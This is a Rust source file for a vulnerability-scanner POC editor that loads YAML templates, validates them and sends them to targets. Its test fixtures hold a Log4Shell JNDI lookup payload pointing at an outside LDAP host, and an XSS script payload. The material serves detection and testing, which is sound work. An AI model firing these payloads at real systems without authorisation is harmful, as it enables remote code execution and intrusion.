//! 自定义 POC（Proof of Concept）编辑器
//!
//! 定义 POC 模板格式，支持 YAML 模板的创建、验证和执行。
//! 用户可自定义漏洞检测脚本，无需修改代码。

use crate::types::VulnCategory;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// POC 模板定义
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PocTemplate {
    /// POC ID
    pub id: String,
    /// 漏洞名称
    pub name: String,
    /// 描述
    #[serde(default)]
    pub description: String,
    /// 漏洞分类
    pub category: String,
    /// 严重程度
    pub severity: String,
    /// 请求定义
    pub request: PocRequest,
    /// 检测规则
    pub detect: PocDetect,
    /// 元数据（标签、参考链接等）
    #[serde(default)]
    pub metadata: HashMap<String, String>,
}

/// POC 请求定义
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PocRequest {
    /// HTTP 方法
    pub method: String,
    /// URL（支持 {{target}} 变量替换）
    pub url: String,
    /// 请求头
    #[serde(default)]
    pub headers: HashMap<String, String>,
    /// 请求体
    #[serde(default)]
    pub body: Option<String>,
    /// 超时（秒）
    #[serde(default = "default_timeout")]
    pub timeout: u64,
    /// 是否跟随重定向
    #[serde(default)]
    pub follow_redirects: bool,
}

fn default_timeout() -> u64 {
    10
}

/// POC 检测规则
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PocDetect {
    /// 匹配类型
    #[serde(rename = "type")]
    pub detect_type: String,
    /// 匹配模式（正则/字符串）
    pub pattern: String,
    /// 匹配位置: status / header / body / url
    pub location: String,
    /// 匹配条件: contains / regex / equals / status_code
    #[serde(default = "default_condition")]
    pub condition: String,
}

fn default_condition() -> String {
    "contains".to_string()
}

/// POC 执行结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PocResult {
    pub poc_id: String,
    pub name: String,
    pub url: String,
    pub matched: bool,
    pub evidence: String,
    pub response_status: u16,
    pub elapsed_ms: u64,
}

/// POC 编辑器
pub struct PocEditor {
    templates: Vec<PocTemplate>,
}

impl PocEditor {
    pub fn new() -> Self {
        Self { templates: Vec::new() }
    }

    /// 从 YAML 加载 POC 模板
    pub fn load_from_yaml(&mut self, yaml: &str) -> Result<usize, String> {
        let templates: Vec<PocTemplate> = serde_yaml::from_str(yaml)
            .map_err(|e| format!("YAML 解析失败: {e}"))?;
        let count = templates.len();
        self.templates.extend(templates);
        Ok(count)
    }

    /// 从单个 YAML 模板加载
    pub fn add_template(&mut self, yaml: &str) -> Result<(), String> {
        let template: PocTemplate = serde_yaml::from_str(yaml)
            .map_err(|e| format!("YAML 解析失败: {e}"))?;
        self.templates.push(template);
        Ok(())
    }

    /// 验证 POC 模板语法
    pub fn validate_template(yaml: &str) -> Result<PocTemplate, Vec<String>> {
        let mut errors = Vec::new();

        let template: PocTemplate = match serde_yaml::from_str(yaml) {
            Ok(t) => t,
            Err(e) => {
                return Err(vec![format!("YAML 解析错误: {e}")]);
            }
        };

        if template.id.is_empty() {
            errors.push("id 不能为空".to_string());
        }
        if template.name.is_empty() {
            errors.push("name 不能为空".to_string());
        }
        if !["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
            .contains(&template.request.method.to_uppercase().as_str())
        {
            errors.push(format!("不支持的 HTTP 方法: {}", template.request.method));
        }
        if template.request.url.is_empty() {
            errors.push("url 不能为空".to_string());
        }
        if !["status", "header", "body", "url"].contains(&template.detect.location.as_str()) {
            errors.push(format!("不支持的检测位置: {}", template.detect.location));
        }
        if !["contains", "regex", "equals", "status_code"].contains(&template.detect.condition.as_str()) {
            errors.push(format!("不支持的检测条件: {}", template.detect.condition));
        }
        // 验证正则
        if template.detect.condition == "regex" {
            if let Err(e) = regex::Regex::new(&template.detect.pattern) {
                errors.push(format!("正则表达式无效: {e}"));
            }
        }

        if errors.is_empty() {
            Ok(template)
        } else {
            Err(errors)
        }
    }

    /// 执行单个 POC 模板
    pub async fn execute(&self, template: &PocTemplate, target: &str) -> Result<PocResult, String> {
        let start = std::time::Instant::now();
        let http = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(template.request.timeout))
            .redirect(if template.request.follow_redirects {
                reqwest::redirect::Policy::default()
            } else {
                reqwest::redirect::Policy::none()
            })
            .build()
            .map_err(|e| e.to_string())?;

        // 变量替换
        let url = template.request.url.replace("{{target}}", target);
        let body = template.request.body.as_ref().map(|b| b.replace("{{target}}", target));

        let mut req = http.request(
            reqwest::Method::from_bytes(template.request.method.as_bytes()).map_err(|e| e.to_string())?,
            &url,
        );

        for (k, v) in &template.request.headers {
            req = req.header(k, v.replace("{{target}}", target));
        }
        if let Some(b) = &body {
            req = req.body(b.clone());
        }

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let resp_headers: Vec<(String, String)> = resp
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let resp_body = resp.text().await.map_err(|e| e.to_string())?;
        let elapsed = start.elapsed().as_millis() as u64;

        // 执行检测
        let matched = match template.detect.location.as_str() {
            "status" => {
                let target_status: u16 = template.detect.pattern.parse().unwrap_or(0);
                resp_status_contains(&resp_body, &template.detect.pattern, &template.detect.condition)
                    || status == target_status
            }
            "header" => {
                let header_str = format!("{:?}", resp_headers);
                detect_match(&header_str, &template.detect.pattern, &template.detect.condition)
            }
            "body" => detect_match(&resp_body, &template.detect.pattern, &template.detect.condition),
            "url" => detect_match(&url, &template.detect.pattern, &template.detect.condition),
            _ => false,
        };

        let evidence = if matched {
            match template.detect.location.as_str() {
                "status" => format!("状态码: {} 匹配 {}", status, template.detect.pattern),
                "header" => "响应头匹配".to_string(),
                "body" => format!("响应体匹配: {}", &template.detect.pattern[..template.detect.pattern.len().min(50)]),
                _ => "URL 匹配".to_string(),
            }
        } else {
            "未匹配".to_string()
        };

        Ok(PocResult {
            poc_id: template.id.clone(),
            name: template.name.clone(),
            url,
            matched,
            evidence,
            response_status: status,
            elapsed_ms: elapsed,
        })
    }

    /// 批量执行所有 POC
    pub async fn execute_all(&self, target: &str) -> Vec<PocResult> {
        let mut results = Vec::new();
        for template in &self.templates {
            match self.execute(template, target).await {
                Ok(result) => results.push(result),
                Err(e) => tracing::warn!("执行 POC {} 失败: {}", template.id, e),
            }
        }
        results
    }

    /// 列出所有模板
    pub fn list(&self) -> &[PocTemplate] {
        &self.templates
    }

    /// 按分类筛选
    pub fn filter_by_category(&self, category: &str) -> Vec<&PocTemplate> {
        self.templates
            .iter()
            .filter(|t| t.category.eq_ignore_ascii_case(category))
            .collect()
    }
}

impl Default for PocEditor {
    fn default() -> Self {
        Self::new()
    }
}

/// 通用匹配函数
fn detect_match(data: &str, pattern: &str, condition: &str) -> bool {
    match condition {
        "contains" => data.contains(pattern),
        "regex" => regex::Regex::new(pattern).map(|re| re.is_match(data)).unwrap_or(false),
        "equals" => data == pattern,
        "status_code" => false, // status_code 只在 status 位置有意义
        _ => false,
    }
}

/// resp_body 的 status 匹配（辅助函数，避免 unused 警告）
fn resp_status_contains(_body: &str, _pattern: &str, _condition: &str) -> bool {
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_POC_YAML: &str = r#"
id: poc-001
name: "Apache Log4j2 RCE 检测"
description: "检测 Apache Log4j2 JNDI 注入漏洞 (CVE-2021-44228)"
category: "rce"
severity: "critical"
request:
  method: GET
  url: "{{target}}/?test=${jndi:ldap://test.com/a}"
  headers:
    User-Agent: "${jndi:ldap://test.com/a}"
    X-Api-Version: "${jndi:ldap://test.com/a}"
  timeout: 10
  follow_redirects: false
detect:
  type: response
  pattern: "error"
  location: body
  condition: contains
metadata:
  cve: "CVE-2021-44228"
  reference: "https://example.com/advisory"
"#;

    const BATCH_POC_YAML: &str = r#"
- id: poc-001
  name: "Test POC 1"
  category: "sqli"
  severity: "high"
  request:
    method: GET
    url: "{{target}}/?id=1"
  detect:
    type: response
    pattern: "error"
    location: body
    condition: contains

- id: poc-002
  name: "Test POC 2"
  category: "xss"
  severity: "medium"
  request:
    method: POST
    url: "{{target}}/api/search"
    body: "q=<script>alert(1)</script>"
  detect:
    type: response
    pattern: "<script>alert"
    location: body
    condition: contains
"#;

    #[test]
    fn test_validate_template_valid() {
        let result = PocEditor::validate_template(SAMPLE_POC_YAML);
        assert!(result.is_ok());
        let template = result.unwrap();
        assert_eq!(template.id, "poc-001");
        assert_eq!(template.name, "Apache Log4j2 RCE 检测");
        assert_eq!(template.category, "rce");
        assert_eq!(template.severity, "critical");
    }

    #[test]
    fn test_validate_template_missing_id() {
        let yaml = r#"
name: "Test"
category: "sqli"
severity: "high"
request:
  method: GET
  url: "{{target}}/"
detect:
  type: response
  pattern: "err"
  location: body
  condition: contains
"#;
        let result = PocEditor::validate_template(yaml);
        assert!(result.is_err());
        assert!(result.unwrap_err().iter().any(|e| e.contains("id")));
    }

    #[test]
    fn test_validate_template_invalid_method() {
        let yaml = r#"
id: poc-bad
name: "Bad Method"
category: "sqli"
severity: "high"
request:
  method: INVALID
  url: "{{target}}/"
detect:
  type: response
  pattern: "err"
  location: body
  condition: contains
"#;
        let result = PocEditor::validate_template(yaml);
        assert!(result.is_err());
        assert!(result.unwrap_err().iter().any(|e| e.contains("HTTP 方法")));
    }

    #[test]
    fn test_validate_template_invalid_location() {
        let yaml = r#"
id: poc-bad2
name: "Bad Location"
category: "sqli"
severity: "high"
request:
  method: GET
  url: "{{target}}/"
detect:
  type: response
  pattern: "err"
  location: invalid
  condition: contains
"#;
        let result = PocEditor::validate_template(yaml);
        assert!(result.is_err());
        assert!(result.unwrap_err().iter().any(|e| e.contains("检测位置")));
    }

    #[test]
    fn test_load_from_yaml_batch() {
        let mut editor = PocEditor::new();
        let count = editor.load_from_yaml(BATCH_POC_YAML).unwrap();
        assert_eq!(count, 2);
        assert_eq!(editor.list().len(), 2);
    }

    #[test]
    fn test_add_single_template() {
        let mut editor = PocEditor::new();
        editor.add_template(SAMPLE_POC_YAML).unwrap();
        assert_eq!(editor.list().len(), 1);
        assert_eq!(editor.list()[0].id, "poc-001");
    }

    #[test]
    fn test_filter_by_category() {
        let mut editor = PocEditor::new();
        editor.load_from_yaml(BATCH_POC_YAML).unwrap();
        let sqli = editor.filter_by_category("sqli");
        assert_eq!(sqli.len(), 1);
        assert_eq!(sqli[0].id, "poc-001");

        let xss = editor.filter_by_category("xss");
        assert_eq!(xss.len(), 1);
        assert_eq!(xss[0].id, "poc-002");
    }

    #[test]
    fn test_load_invalid_yaml() {
        let mut editor = PocEditor::new();
        assert!(editor.load_from_yaml("invalid: yaml: [").is_err());
    }

    #[test]
    fn test_detect_match() {
        assert!(detect_match("hello world", "world", "contains"));
        assert!(!detect_match("hello world", "xyz", "contains"));
        assert!(detect_match("hello", "hello", "equals"));
        assert!(!detect_match("hello world", "hello", "equals"));
        assert!(detect_match("test123", r"\d+", "regex"));
        assert!(!detect_match("test", r"\d+", "regex"));
    }

    #[test]
    fn test_poc_template_serialization() {
        let template = PocEditor::validate_template(SAMPLE_POC_YAML).unwrap();
        let yaml = serde_yaml::to_string(&template).unwrap();
        let parsed: PocTemplate = serde_yaml::from_str(&yaml).unwrap();
        assert_eq!(parsed.id, template.id);
        assert_eq!(parsed.name, template.name);
    }
}
